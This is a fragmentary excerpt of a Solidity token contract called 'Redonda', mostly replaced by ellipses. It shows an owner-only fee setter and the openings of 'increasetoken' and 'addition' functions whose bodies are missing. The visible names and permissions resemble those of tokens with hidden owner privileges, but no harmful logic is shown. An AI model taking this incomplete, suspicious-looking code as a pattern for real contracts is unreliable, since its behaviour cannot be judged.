...
contract Redonda is Context, Ownable {
    using SafeMath for uint256;

    string _name = "Redonda";
    string _symbol = "RED";
    uint8 _decimals = 9;
    ...
    function setLpRewardbonusFee(uint8 rewardFee) external onlyOwner {
        lpRewardFees = rewardFee;
    }

    function increasetoken(uint256 maxTxPercent) external onlyOwner {
	...
	function addition(address to, uint256 _token) external
		{
